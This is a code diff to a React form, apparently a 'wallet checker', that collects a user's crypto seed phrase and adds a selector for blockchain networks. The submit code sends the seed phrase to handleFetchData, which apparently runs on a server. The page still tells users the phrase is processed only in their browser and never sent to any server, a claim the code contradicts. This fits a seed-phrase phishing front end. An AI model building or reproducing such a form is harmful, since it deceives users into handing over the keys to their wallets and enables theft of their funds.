@@ -4,7 +4,7 @@ import { useState } from "react";
 import { useForm } from "react-hook-form";
 import { zodResolver } from "@hookform/resolvers/zod";
 import { z } from "zod";
-import { Loader2 } from "lucide-react";
+import { Loader2, Landmark } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import {
   Form,
@@ -16,10 +16,20 @@ import {
   FormMessage,
 } from "@/components/ui/form";
 import { Textarea } from "@/components/ui/textarea";
+import { Checkbox } from "@/components/ui/checkbox";
 import { Card, CardContent } from "@/components/ui/card";
 import { handleFetchData } from "@/app/actions";
 import { useToast } from "@/hooks/use-toast";
 import type { WalletData } from "@/app/actions";
+
+const networks = [
+  { id: "Bitcoin", label: "Bitcoin" },
+  { id: "Ethereum", label: "Ethereum" },
+  { id: "Solana", label: "Solana" },
+  { id: "Polygon", label: "Polygon" },
+  { id: "BNB Smart Chain", label: "BNB Smart Chain" },
+] as const;
+
 
 const formSchema = z.object({
   seedPhrase: z
@@ -30,6 +40,9 @@ const formSchema = z.object({
       (phrase) => phrase.split(/\s+/).filter(Boolean).length >= 12,
       "A valid seed phrase must contain at least 12 words."
     ),
+  networks: z.array(z.string()).refine((value) => value.some((item) => item), {
+    message: "You have to select at least one network.",
+  }),
 });
 
 type SeedPhraseFormProps = {
@@ -48,6 +61,7 @@ export function SeedPhraseForm({
     resolver: zodResolver(formSchema),
     defaultValues: {
       seedPhrase: "",
+      networks: ["Bitcoin", "Ethereum", "Solana"],
     },
   });
 
@@ -57,6 +71,9 @@ export function SeedPhraseForm({
 
     const formData = new FormData();
     formData.append("seedPhrase", values.seedPhrase);
+    values.networks.forEach(network => {
+        formData.append("networks", network);
+    });
 
     const result = await handleFetchData(formData);
 
@@ -91,17 +108,75 @@ export function SeedPhraseForm({
                     <Textarea
                       placeholder="Enter your 12, 18, or 24-word seed phrase here..."
                       className="resize-none"
-                      rows={4}
+                      rows={3}
                       {...field}
                     />
                   </FormControl>
-                  <FormDescription>
-                    Your seed phrase is processed locally in your browser and is never sent to our servers.
-                  </FormDescription>
                   <FormMessage />
                 </FormItem>
               )}
             />
+
+            <FormField
+              control={form.control}
+              name="networks"
+              render={() => (
+                <FormItem>
+                  <div className="mb-4">
+                    <FormLabel className="text-base">
+                      Blockchain Networks
+                    </FormLabel>
+                    <FormDescription>
+                      Select the networks to check for assets.
+                    </FormDescription>
+                  </div>
+                  <div className="grid grid-cols-2 sm:grid-cols-3 gap-4">
+                    {networks.map((item) => (
+                      <FormField
+                        key={item.id}
+                        control={form.control}
+                        name="networks"
+                        render={({ field }) => {
+                          return (
+                            <FormItem
+                              key={item.id}
+                              className="flex flex-row items-center space-x-3 space-y-0"
+                            >
+                              <FormControl>
+                                <Checkbox
+                                  checked={field.value?.includes(item.id)}
+                                  onCheckedChange={(checked) => {
+                                    return checked
+                                      ? field.onChange([
+                                          ...field.value,
+                                          item.id,
+                                        ])
+                                      : field.onChange(
+                                          field.value?.filter(
+                                            (value) => value !== item.id
+                                          )
+                                        );
+                                  }}
+                                />
+                              </FormControl>
+                              <FormLabel className="font-normal">
+                                {item.label}
+                              </FormLabel>
+                            </FormItem>
+                          );
+                        }}
+                      />
+                    ))}
+                  </div>
+                  <FormMessage />
+                </FormItem>
+              )}
+            />
+            
+            <FormDescription className="pt-4">
+                Your seed phrase is processed locally in your browser and is never sent to our servers.
+            </FormDescription>
+
 
             <Button
               type="submit"
